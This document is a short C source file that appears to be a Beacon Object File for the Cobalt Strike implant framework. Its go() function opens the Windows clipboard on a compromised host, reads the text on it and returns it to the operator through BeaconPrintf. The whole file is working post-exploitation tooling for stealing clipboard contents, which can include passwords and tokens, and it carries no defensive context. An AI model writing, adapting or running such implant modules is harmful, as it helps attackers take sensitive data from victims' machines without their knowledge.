#include <windows.h>
#include <string.h>
#include <winuser.h>
#include "beacon.h"

DECLSPEC_IMPORT HWND WINAPI KERNEL32$GetConsoleWindow(void);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT WINUSERAPI HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT WINUSERAPI BOOL  WINAPI USER32$CloseClipboard(void);


 void go() {

    HWND owner = KERNEL32$GetConsoleWindow(); 
    USER32$OpenClipboard(owner);
    owner = USER32$GetClipboardData(CF_TEXT);
    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", (char *)owner);;
    USER32$CloseClipboard();
 }